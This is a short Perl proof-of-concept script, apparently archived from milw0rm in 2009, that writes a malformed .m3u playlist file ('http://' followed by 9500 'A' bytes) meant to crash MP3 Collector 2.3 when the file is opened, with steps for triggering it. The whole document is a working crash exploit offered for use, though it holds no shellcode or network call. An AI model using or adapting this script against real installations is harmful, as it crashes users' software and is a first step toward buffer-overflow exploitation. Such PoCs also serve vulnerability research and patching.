#!/usr/bin/perl
# MP3 Collector 2.3 (m3u File) Local Crash PoC
# By : zAx
# Application Homepage : http://collectorz.com
# Application Download : http://downloads.collectorz.com/mp3collectorsetup.exe
# Go to Playlist menu, select Open Playlist, Select the File and a click on file name.

$header = "http://";
$crash = "\x41" x 9500; # Just a Random size .
my $file = "CraSH.m3u";
open(my $FILE, ">>$file") or die "Cannot open $file: $!";
print $FILE $header.$crash;
close($FILE);
print "Done \n";

# milw0rm.com [2009-09-15]
